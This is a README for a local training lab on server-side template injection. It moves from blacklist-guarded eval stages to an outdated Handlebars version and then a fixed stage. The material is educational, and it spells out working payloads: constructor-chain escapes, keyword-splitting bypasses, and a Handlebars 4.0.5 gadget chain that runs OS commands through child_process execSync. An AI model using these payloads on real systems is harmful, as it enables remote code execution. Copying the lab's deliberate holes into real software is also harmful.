# Lab 11 — Server-Side Template Injection

| | |
|---|---|
| **Tier** | 3 — Injection+ |
| **OWASP** | A03:2021 – Injection |
| **Difficulty** | medium |
| **Stages** | 6 vulnerable + 1 fixed |

## 🎯 The scenario
A greeting-preview feature **compiles the template you supply** on the server. Make it
run code and read the server secret held in `__SSTI_FLAG__` (value `SSTI{…}`) — reading
it proves your template executed, i.e. RCE. Stage 6 additionally accepts real OS command
output (`uid=…`) as proof, since that gadget reaches full command execution, not just a
JS variable.

> A stage is solved when the render leaks the secret (or, on Stage 6, runs a real OS
> command). The fixed stage must render every payload literally while a normal greeting
> still works.

## 🧠 The one idea
Compiling untrusted input as a template **is `eval`**. Template expressions run as
server-side code with full runtime access. Blacklisting delimiters or identifiers never
holds — the fix is to keep templates static and pass user input as **bound data**.

> ⚠️ This lab's engine intentionally evaluates expressions with the `Function`
> constructor so injection is real. Stage 6 also pins a deliberately outdated,
> known-vulnerable `handlebars` version (`npm install`/`npm audit` will flag it —
> that's expected). It's for local learning only.

---

## Stage 1 — Template compiled from user input · `/stage/1`
```js
tpl.replace(/{{(.+?)}}/g, (_, e) => evalExpr(e))   // 🔴 compiles user input
```
**Exploit:** `{{ 7*7 }}` proves it; `{{ global.__SSTI_FLAG__ }}` reads the secret.

## Stage 2 — Delimiter blacklist · `/stage/2`
```js
if (/{{|}}/.test(tpl)) reject;   // 🔴 engine still evaluates {% %}
```
**Exploit:** `{% global.__SSTI_FLAG__ %}`. **Root cause:** the feature, not the braces, is the bug.

## Stage 3 — Keyword blacklist: global · `/stage/3`
```js
if (/global|require/i.test(tpl)) reject;   // 🔴 misses `this`
```
**Exploit:** `{{ this.__SSTI_FLAG__ }}` — a non-strict function's `this` is the global object.

## Stage 4 — Bigger keyword blacklist · `/stage/4`
```js
if (/global|globalThis|this|process|function|require/i.test(tpl)) reject;   // 🔴 constructor chain
```
**Exploit:** `{{ ''.constructor.constructor('return __SSTI_FLAG__')() }}` — `''.constructor.constructor` is `Function`, which runs in global scope where the secret is a bare identifier.

## Stage 5 — Blacklist: constructor · `/stage/5`
```js
if (/…|constructor|require/i.test(tpl)) reject;   // 🔴 string construction
```
**Exploit:** `{{ ''['con'+'structor']['con'+'structor']('return __SSTI_FLAG__')() }}` — the banned word never appears literally.

> Stages 3–5 also blacklist `require` defensively. `require` is injected per-module by
> Node's CommonJS loader, not attached to `global`, so a bare reference inside a freshly
> built `Function` normally throws — that holds for the app as actually run (`node
> server.js`). It's only `node -e "..."` one-liners that special-case `require` onto
> `global` for convenience; testing exclusively that way can produce a false sense that
> a bypass exists in the deployed app when it doesn't. Blacklisting `require` here costs
> nothing and closes the gap regardless of execution context.

## Stage 6 — Real engine, outdated version · `/stage/6`
```js
Handlebars.compile(tpl)({})   // 🔴 real engine, but pinned to a version predating its own security patch
```
**Exploit:** the developer swapped the homemade evaluator for real, logic-less Handlebars —
`{{ this.constructor }}` and friends are blocked by the library itself now. But this app
pins `handlebars@4.0.5`, which predates the `protoAccessControl` patch that later releases
added specifically to stop `constructor` resolution. The published gadget for that version
range walks `with`/`lookup`/array `push`/`pop` to smuggle a `constructor` reference past the
parser one property at a time, reaching `Function`:
```
{{#with "s" as |string|}}{{#with split as |conslist|}}{{this.pop}}
{{this.push (lookup string.sub "constructor")}}{{this.pop}}
{{#with string.split as |codelist|}}{{this.pop}}
{{this.push "return global.__SSTI_FLAG__;"}}{{this.pop}}
{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}
{{/with}}{{/with}}{{/with}}
```
That last `push`ed line is a plain JS return statement — swap it for
`return process.mainModule.require('child_process').execSync('id').toString();` to go past
reading a variable and run a real OS command instead. This stage accepts either form of
proof: the flag, or output matching `uid=…`. Use `process.mainModule.require(...)`, not
bare `require(...)` — `require` is per-module, not a real global, so a bare reference
inside the freshly built `Function` throws `ReferenceError`. Also use `execSync`, not
`exec` — `exec` is async and returns a `ChildProcess` object immediately, before the
command has produced any output.

**Root cause:** a "safe by design" engine can still ship a version-specific CVE — you can't
derive this gadget chain from JS semantics alone; you have to fingerprint the exact engine
and version, then find its published exploit. (Modern Handlebars hard-blocks `constructor`
even with prototype-access options re-enabled — this CVE is why that guard exists.)

## Stage 7 — Input as data, not template · `/fixed`
```js
const TEMPLATE = 'Hello {{ user }}';   // fixed server-side
TEMPLATE.replace(/{{(.+?)}}/g, (_, key) => escapeHtml(String(data[key.trim()])));   // 🟢 bound, encoded
```
The request only supplies the *value* of `user`; the template is a constant. Every
earlier payload is displayed literally. Separate code from data.

### ❌ Common wrong "fixes"
- **Blacklisting delimiters** (Stage 2) or **identifiers** (Stages 3–5) — endless bypasses.
- **A homemade "sandbox"** around eval — the constructor chain escapes it.
- **Switching to a "safe" real template engine** without keeping it patched (Stage 6) —
  logic-less-by-design engines have still shipped RCEs in specific versions.

### ✅ Takeaways
- Never compile untrusted input as a template.
- Keep templates static; pass user input as bound, output-encoded data.
- If you need user-authored templates, use a real logic-less/sandboxed engine, keep it
  patched, and still treat it as untrusted.

## ▶️ Run it
```bash
npm run dev                              # → http://localhost:4011
# or: cd labs/11-ssti && docker compose up
```

## 🧪 Tests
```bash
cd exploit && npm install && npm test
```
Each vulnerable stage must leak the secret; `/fixed` must render every payload literally
while still greeting normally.
